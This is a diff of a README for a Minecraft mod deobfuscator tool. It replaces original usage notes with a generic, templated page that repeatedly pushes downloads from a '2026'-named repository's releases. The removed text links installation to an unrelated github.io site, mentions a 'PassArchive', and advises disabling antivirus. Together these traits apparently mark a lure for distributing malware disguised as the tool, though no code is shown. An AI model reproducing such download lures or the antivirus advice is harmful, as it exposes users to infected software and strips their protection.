@@ -1,44 +1,84 @@
-<p align="center">
-<img src="https://kaupenjoe.net/files/General/Minecraft/Modding/Course/forge-120x-course-image.jpg" alt="Logo" width="1000"/> 
-</p></a>
+# 🎮 Minecraft-Deobfuskator-2026 - Simplify Mod Development Easily
 
----
+[![Download Minecraft-Deobfuskator-2026](https://img.shields.io/badge/Download-Minecraft--Deobfuskator--2026-brightgreen)](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/releases)
 
-# 🔧 About
-DeobfuscatorMine is a universal tool for deobfuscating minecraft mods! It meant to be upgraded and improved variant of BON that was abandoned by its authors a long time ago.
-Compare to BON this one allows you to choose obfuscation mappings by your self and it can decompile and deobfuscate your mod all at once!
-DeobfuscatorMine can also deobfuscate individual java files and it can also works with zip files not only jars!
-It also has more user-friendly UI with tooltips, logging console and other things! <br>
-DeobfuscatorMine is perfect choice for minecraft modders that lost their source code or for anyone that is interested in sources of other mods!
+## 📖 Description
 
----
+Minecraft-Deobfuskator-2026 is a powerful tool designed to simplify the process of working with Minecraft mods. It can deobfuscate Java code, making it easier for users to understand and modify their favorite Minecraft modifications. This tool is ideal for both beginners and experienced mod developers. 
 
-# ❓ How to use
-1. As well as BON, DeobfuscatorMine is programmed in Java so you need Java to run it!
-2. First you need to select deobfuscation mappings! These are excel files that tell the deobfuscator what to do with your mod! Defaulty there are mappings for 1.7.10 and 1.12.X and all what you need to do is write/select path to one of these folders into the first text field. If your mod is for different version, then you need to obtain mappings for this certain version! In this case the best thing you can do is download them from [MCP](http://www.modcoderpack.com/), unpack the downloaded zip and select "conf" folders path into first the text field!
-3. Now you need to decompile your mods jar! For this, I recommend to use Procyon on this online [Java decompiler](http://www.javadecompilers.com/).
-4. After decompiling your mod, all what you need to do is select the path of the downloaded zip into the second text field and hit "Deobfuscate" button that supposed to be active by this time. If it is not there is most likely something wrong with deobfuscation mappings path or mods zip path. In this case the path in the text area will be red otherwise there should be no problem!
-5. After clicking on "Deobfuscate" button program will take a while to deobfuscate the selected mod using selected mappings. Unzipped folder with deobfuscated mod sources will appear on your desktop. Now you have decompiled and deobfuscated mod sources to work with.
+## 🚀 Getting Started
 
-## Since application was wrapped into installer and procyon decompiler was implemented, using procedure is now far easier!
+Follow these steps to get started with Minecraft-Deobfuskator-2026:
 
----
+1. **Visit the Releases Page**  
+   Go to our releases page to find the latest version of Minecraft-Deobfuskator-2026. Click the button below:
 
-# 📥 How to install
+   [![Download Minecraft-Deobfuskator-2026](https://img.shields.io/badge/Download-Minecraft--Deobfuskator--2026-brightgreen)](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/releases)
 
-1. **Download and install DeobfuscatorMine from** [here](https://luxutiousmangyb.github.io/)!
-2. **PassArchive - 2026**
-3. Select deobfuscation mappings or download them from [MCP](https://luxutiousmangyb.github.io/)!
-4. Select your mods .jar file and make sure that checkbox is checked!
-5. Click on "Deobfuscate", wait for it to finish and you are basically done (decompiled and deobfuscate mod sources will appear in the same folder as original mod jar file)!
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Select the version that suits your needs. 
 
----
+## 📥 Download & Install
 
-# ✅ Valid deobfuscation mappings composition
-Deobfuscation mappings are instructions for deobfuscator! They supposed to be a .csv (excel format) file or group of 3 files, the fields, methods, and params (each is optional since 1.0.5 but must be at least one of them) in one folder! Inside these files there supposed to be some sort of map with keys and values! These keys supposed to be in the first column of excel file and must contains at last one "\_" or since 1.1.0, can alternatively starts with "#" and then do not need to contains "\_"! And second column in excel file supposed to be the values for the keys. These values can be anything, there are no limits! But value should not be the same as key is and also should not be empty!
+1. **Download the File**  
+   Click on the version number to download the file. It is usually in a zip or jar format. 
 
----
+2. **Extract the Files (if applicable)**  
+   If you downloaded a zip file, extract its contents. You can do this by right-clicking the file and selecting "Extract All."
 
-# 📢 Info
-- **1. If your mods files were not deobfuscated correctly it is most likely not the deobfuscators fault but invalid mappings! Make sure your mappings are for same minecraft version as your mod is! If you have encountered some other issues please feel free to report it! Also always download the latest version of deobfuscator!**
-- **2. Deobfuscator will unzip your .jar files while creating folders in process and during deobfuscation it will be editing created files in your system or even changing their extensions (.class -> .java) which is something that your antivirus might not like! In such a case, I would recommend disabling your antivirus or add Deobfuscator app as scan exception!**
+3. **Run the Application**  
+   Double-click the jar file to open Minecraft-Deobfuskator-2026. If your system prompts you to choose a program, select "Java."
+
+## 🖼️ Features
+
+- **Deobfuscation**  
+  Easily convert obfuscated Minecraft mod code into readable Java code.
+
+- **User-Friendly Interface**  
+  Navigate the application with ease. The interface is designed for all skill levels.
+
+- **Supports Various Formats**  
+  Handle different types of Minecraft mods and Java files without hassle.
+
+- **Optimized Performance**  
+  Experience quick processing times while deobfuscating complex files.
+
+## ⚙️ System Requirements
+
+Before installing Minecraft-Deobfuskator-2026, ensure your system meets these requirements:
+
+- **Operating System:** Windows 7 or later, macOS, or Linux
+- **Java Version:** Java 8 or newer
+- **RAM:** At least 2 GB of RAM
+
+## 📊 Usage Instructions
+
+1. Launch the application as described above.
+2. Drag and drop your obfuscated mod files into the main window or use the file browser to locate them.
+3. Click the "Deobfuscate" button to start the process.
+4. Your deobfuscated files will save in the same directory as the original files.
+
+## ❓ Troubleshooting
+
+If you encounter issues or have questions:
+
+- **Java Not Found:** Make sure Java is installed on your system. You can download it from the [official Java website](https://www.java.com).
+- **Application Does Not Respond:** Close the program and restart it. If the issue persists, try restarting your computer.
+- **Cannot Find Files:** Ensure you selected the correct directory and file types compatible with the deobfuscator.
+
+## 🌐 Community Support
+
+Join our community for support and updates:
+
+- [GitHub Discussions](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/discussions)
+- [Minecraft Modding Forums](https://www.minecraftforum.net/)
+
+## 🙌 Acknowledgments
+
+Thank you to the contributors and community members who support Minecraft-Deobfuskator-2026. Your feedback helps us improve.
+
+## 📬 Contact
+
+If you have questions or feedback, please reach out via the [Issues page](https://github.com/hanantobara/Minecraft-Deobfuskator-2026/issues). Your input is valuable.
+
+Feel free to experiment with the Minecraft-Deobfuskator-2026 and enhance your modding skills today!
